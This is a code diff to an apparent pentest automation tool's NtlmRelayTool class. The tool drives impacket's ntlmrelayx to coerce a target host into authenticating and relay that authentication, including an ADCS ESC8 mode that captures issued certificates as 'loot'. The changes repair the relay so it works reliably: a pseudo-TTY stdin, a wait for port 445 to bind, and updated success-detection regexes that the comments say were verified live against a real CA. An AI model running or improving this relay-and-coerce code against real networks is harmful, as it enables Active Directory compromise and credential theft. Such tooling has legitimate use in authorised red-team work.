@@ -157,17 +157,33 @@ class NtlmRelayTool(MacroTool):
             pass
 
         self.log(f"[run] ntlmrelayx -> {relay_to}  [{goal}], listener {listener}")
+        # ntlmrelayx's main thread blocks on a stdin read; with a closed stdin
+        # (DEVNULL) it hits EOF and exits right after "waiting for connections",
+        # taking its listener threads with it — so the coerced auth lands on a
+        # dead port 445. Give it a pseudo-TTY on stdin so it stays alive (the same
+        # reason it survives under tmux/screen but not `nohup … &`). Verified live.
+        import pty
+        master_fd = None
         try:
+            master_fd, slave_fd = pty.openpty()
             fh = open(log, "w")
             proc = subprocess.Popen(
                 [relayx, *args], stdout=fh, stderr=subprocess.STDOUT,
-                stdin=subprocess.DEVNULL, preexec_fn=os.setsid)
+                stdin=slave_fd, preexec_fn=os.setsid)
+            os.close(slave_fd)
         except Exception as e:
             self.log(f"[!] failed to start ntlmrelayx: {e}")
             return
 
         try:
-            time.sleep(3)                            # let the listener bind
+            # wait for the SMB listener to actually bind 445 before coercing
+            for _ in range(12):
+                time.sleep(1)
+                if _port_listening(445):
+                    break
+            else:
+                self.log("[!] ntlmrelayx never bound 445 — is smbd holding it? "
+                         "stop it first: sudo systemctl stop smbd nmbd")
             self.log(f"[run] coercing {target} to authenticate to {listener} (via {coerce_via})")
             if coerce_via == "coercer":
                 self.sub("coercer", target=target, listener=listener,
@@ -178,12 +194,17 @@ class NtlmRelayTool(MacroTool):
                          module="coerce_plus", module_options=f"LISTENER={listener}",
                          username=kw.get("username", ""), password=kw.get("password", ""),
                          domain=kw.get("domain", ""))
-            time.sleep(12)                           # let the relay + action finish
+            time.sleep(18)                           # let the relay + action finish
         finally:
             try:
                 os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
             except Exception:
                 pass
+            if master_fd is not None:
+                try:
+                    os.close(master_fd)
+                except Exception:
+                    pass
             try:
                 fh.close()
             except Exception:
@@ -205,8 +226,13 @@ class NtlmRelayTool(MacroTool):
         if mode == "adcs":
             m = re.search(
                 r"Base64 certificate of user[^\n]*\n((?:[A-Za-z0-9+/=]+\n)+)", out)
-            saved = re.search(r"Saved (?:PKCS#12|certificate)[^\n]*?(\S+\.pfx)", out)
-            if m or saved or re.search(r"certificate.*(?:issued|SUCCEED)", out, re.I):
+            # impacket's ESC8 success lines (verified live against a real CA):
+            #   "GOT CERTIFICATE! ID n" / "Writing PKCS#12 certificate to ./HOST.pfx"
+            saved = re.search(
+                r"(?:Writing PKCS#12 certificate to|Saved (?:PKCS#12|certificate)[^\n]*?to)\s*"
+                r"(\S+\.pfx)", out)
+            if (m or saved or "GOT CERTIFICATE" in out.upper()
+                    or "certificate successfully written" in out.lower()):
                 if saved:
                     self.set_var("pfx", saved.group(1))
                 self.add_loot(
@@ -277,3 +303,17 @@ def kw_domain(out: str) -> str:
     """Best-effort domain from a relayed SMB banner, else empty."""
     m = re.search(r"\(domain:([A-Za-z0-9.\-]+)\)", out)
     return m.group(1) if m else ""
+
+
+def _port_listening(port: int) -> bool:
+    """True if something on this host is accepting connections on *port* — used to
+    confirm ntlmrelayx's SMB server bound 445 before we trigger the coercion."""
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(0.5)
+    try:
+        return s.connect_ex(("127.0.0.1", port)) == 0
+    except OSError:
+        return False
+    finally:
+        s.close()
